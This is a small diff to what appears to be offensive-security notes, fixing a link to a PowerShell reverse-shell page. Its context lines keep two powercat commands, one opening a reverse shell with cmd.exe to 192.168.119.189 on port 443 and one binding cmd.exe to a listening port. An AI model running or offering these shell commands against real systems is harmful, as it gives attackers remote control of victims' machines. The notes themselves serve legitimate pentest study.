@@ -45,8 +45,8 @@ powercat -c 192.168.119.189 -p 443 -e cmd.exe
 powercat -l -p 443 -e cmd.exe
 ```
 
-{% content-ref url="../../collections/reverse-shell/powershell-1.md" %}
-[powershell-1.md](../../collections/reverse-shell/powershell-1.md)
+{% content-ref url="../../collections/reverse-shell/powershell.md" %}
+[powershell.md](../../collections/reverse-shell/powershell.md)
 {% endcontent-ref %}
 
 {% content-ref url="../../collections/bind-shell/powershell.md" %}
